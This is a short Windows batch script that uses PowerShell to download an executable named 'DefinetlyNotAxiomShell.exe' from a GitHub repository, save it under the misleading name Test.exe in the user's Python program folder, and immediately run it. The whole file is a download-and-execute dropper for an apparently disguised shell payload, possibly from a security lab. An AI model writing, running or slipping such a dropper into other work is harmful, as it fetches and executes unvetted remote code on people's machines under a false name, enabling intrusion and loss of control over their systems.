@echo off

set "APP=%LOCALAPPDATA%\Programs\Python\Test.exe"
set "BASE=%LOCALAPPDATA%\Programs\Python"
set "OUT=%BASE%\Test.exe"

"%BASE%\cmd.exe" /c powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'https://github.com/TsoupeisEleftherios/CyberSecurity/blob/main/DefinetlyNotAxiomShell.exe' -OutFile '%OUT%'"

"%APP%" "param1" "param2"

exit /b 0
